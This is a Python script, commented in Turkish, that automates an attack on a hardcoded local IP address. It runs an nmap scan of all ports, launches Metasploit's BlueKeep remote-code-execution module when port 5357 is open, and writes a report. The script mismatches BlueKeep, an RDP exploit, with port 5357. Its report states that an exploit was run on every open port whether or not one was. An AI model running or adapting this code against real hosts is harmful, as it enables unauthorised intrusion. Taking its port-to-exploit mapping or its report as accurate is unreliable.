import subprocess

# Nmap ile port taraması yap
def port_tarama(ip):
    print(f"{ip} adresinde port taraması yapılıyor...")
    command = f"nmap -p- -oN portlar_{ip}.txt {ip}"
    subprocess.run(command, shell=True)

    # Taramayı bitirip portları parse et
    with open(f"portlar_{ip}.txt", "r") as file:
        lines = file.readlines()

    # Açık portları filtreleyelim
    acik_portlar = []
    for line in lines:
        if "open" in line:
            port = line.split("/")[0].strip()
            acik_portlar.append(port)

    return acik_portlar

# Metasploit ile exploit çalıştır
def exploit_calistir(ip, port):
    print(f"{ip} adresindeki {port}/tcp portuna exploit çalıştırılıyor...")
    
    # Metasploit konsolunda bir payload çalıştırma örneği
    if port == "5357":
        command = f"msfconsole -x 'use exploit/windows/rdp/cve_2019_0708_bluekeep_rce; set RHOST {ip}; set RPORT 5357; run'"
    elif port == "5040":
        command = f"msfconsole -x 'use auxiliary/scanner/tcp/portscan; set RHOST {ip}; set RPORT {port}; run'"
    else:
        command = f"echo 'Port {port} için uygun exploit bulunamadı.'"

    subprocess.run(command, shell=True)

# Raporlama yap
def raporlama(ip, acik_portlar):
    with open(f"sonuc_{ip}.txt", "w") as report_file:
        report_file.write(f"Tarama Sonuçları: {ip}\n")
        report_file.write(f"Açık Portlar: {', '.join(acik_portlar)}\n")
        
        # Exploit Sonuçları
        for port in acik_portlar:
            report_file.write(f"{port}/tcp portu için exploit çalıştırıldı.\n")

    print(f"Rapor {ip} için 'sonuc_{ip}.txt' dosyasına kaydedildi.")

# Ana program
def main():
    ip = "192.168.1.161"  # Hedef IP
    acik_portlar = port_tarama(ip)  # Port taraması yap
    print(f"Açık Portlar: {acik_portlar}")
    
    # Exploit çalıştır
    for port in acik_portlar:
        exploit_calistir(ip, port)
    
    # Rapor oluştur
    raporlama(ip, acik_portlar)

if __name__ == "__main__":
    main()
